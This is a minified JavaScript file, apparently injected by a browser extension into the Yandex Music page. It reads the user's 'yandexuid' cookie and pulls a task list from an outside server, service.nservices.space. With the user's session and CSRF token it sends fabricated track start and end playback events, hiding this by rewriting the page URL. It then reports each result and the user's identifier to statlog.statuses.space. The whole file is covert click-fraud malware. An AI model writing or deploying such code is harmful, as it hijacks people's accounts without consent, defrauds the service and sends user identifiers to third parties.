!function(t){if(!window.yaMusicStart){window.yaMusicStart=!0;var e="https://saltcdn2.yandex.ru",a="https://music.yandex.ru/",n=!1,i=function(){return this.logData={fingerprint:"",type:"",type_task:"",timeStart:0,timeEnd:0,id:0,v:"",urls:[],error:0},this.add("type","Chrome_aa14"),this.add("type_task","yamusic"),this},r=function(){return this};r.prototype={getSend:function(t,e,a,n,i){this.sender("GET",t,null,e,a,n,i)},postSend:function(t,e,a,n,i,r){this.sender("POST",t,e,a,n,i,r)},sender:function(t,e,a,n,i,r,s){var o=new XMLHttpRequest;if(o.open(t,e,!0),r||"POST"!==t||o.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),o.onreadystatechange=function(){4!==o.readyState||200!==o.status&&204!==o.status?4===o.readyState&&200!==o.status&&204!==o.status&&i&&i():n&&n(o.responseText)},s)for(var d in s)o.setRequestHeader(d,s[d]);a?o.send(a):o.send()}};var s=new r;i.prototype={add:function(t,e){this.logData[t]=e},push:function(t,e){this.logData[t].push(e)},send:function(){var t={url:"https://statlog.statuses.space/event",log:this.logData};window.parent.postMessage(JSON.stringify(t),e)},sendOk:function(){this.add("timeEnd",v()),this.send()},sendError:function(t){this.add("timeEnd",v()),this.add("error",t),this.send()}};var o=document,d=function(t){var e=o.cookie.match(new RegExp("(?:^|; )"+t.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return e?e[1]:""},u="",c=function(t){if(t.origin===e)try{var a=JSON.parse(t.data);if(a&&a.yf&&"14"===a.yf&&a.res){if(!n)return;n=!1,f(a.res)}}catch(t){}},p=function(t){for(var e="",a=0;a<t;a++)e+=Math.floor(10*Math.random()).toString();return e},m=function(){var t={url:"https://service.nservices.space/youlist.php?worker=14&uid="+u,yf:"14"};n||(n=!0,window.parent.postMessage(JSON.stringify(t),e))},l=function(t){var e=new i;e.add("fingerprint","ym"+u),e.add("timeStart",v()),e.add("id",parseInt(t.id)),e.add("v",t.item);var n=t.item.split("_"),r=document.location.href;window.history.replaceState({},"",a+"album/"+n[0]+"/track/"+n[1]);var d={Accept:"application/json; q=1.0, text/*; q=0.8, */*; q=0.1","Content-Type":"application/json","X-Requested-With":"XMLHttpRequest","X-Retpath-Y":encodeURIComponent(o.location.href)};s.getSend(a+"api/v2.1/handlers/auth?external-domain=music.yandex.ru&overembed=no&__t="+h(),function(e){var o=JSON.parse(e);s.getSend(a+"album/"+n[0]+"/track/"+n[1],function(e){var c=e.match(/>var [a-zA-Z]{2}=(.*?);<\/script>/i);if(c){for(var m=JSON.parse(c[1]),l=null,f=0;f<m.pageData.volumes[0].length;f++)parseInt(m.pageData.volumes[0][f].id)===parseInt(n[1])&&(l=m.pageData.volumes[0][f]);if(!l)return void window.history.replaceState({},"",r);var y=Math.ceil(l.durationMs/1e3)+1,g=h()-y,w=(l.durationMs/1e3).toPrecision(6),S=p(16)+"-"+g,b=p(16),k=o.device_id+":"+n[1]+":"+b,x=a+"api/v2.1/handlers/track/"+n[1]+":"+n[0]+"/web-album_track-album-album-main/feedback/",_={timestamp:g,data:[{sendReason:"start",from:"web-album_track-album-album-main",addTracksToPlayerTime:S,restored:!1,yaDisk:!1,duration:w,position:0,played:0,playId:k,context:"album",contextItem:n[0],timestamp:g,trackId:n[1].toString(),album:n[0]}],sign:o.csrf,"external-domain":"music.yandex.ru",overembed:"no"};s.postSend(x+"start?__t="+h(),JSON.stringify(_),function(e){var a={timestamp:h(),data:[{sendReason:"end",from:"web-album_track-album-album-main",addTracksToPlayerTime:S,restored:!1,yaDisk:!1,duration:w,position:w,played:w,playId:k,context:"album",contextItem:n[0],timestamp:h(),trackId:n[1].toString(),album:n[0]}],sign:o.csrf,"external-domain":"music.yandex.ru",overembed:"no"};s.postSend(x+"end?__t="+h(),JSON.stringify(a),function(e){window.history.replaceState({},"",r);var a=JSON.parse(e);a&&a.result&&!0===a.result&&function(t){var e=new i;e.add("fingerprint","ya"+u),e.add("timeStart",v()),e.add("id",parseInt(t.id)),e.add("v",t.item),e.add("error",0),e.add("type_task","yamusic"),e.sendOk()}(t)},null,!0,d)},null,!0,d)}})},null,!1,d)},f=function(t){if(y(t[42]))for(var e in t[42])l({id:e,item:t[42][e]});setTimeout(function(){m()},6e4)},y=function(t){return void 0!==t},h=Date.now||function(){return+new Date},v=function(){return Math.ceil(h()/1e3)},g=function(){var t;"https://music.yandex.ru/iframe/"===o.location.href&&(t=d("yandexuid"))&&(u=t,window.addEventListener("message",c),m())},w=function(){window.document&&o.body?g():setTimeout(w,100)};w()}}();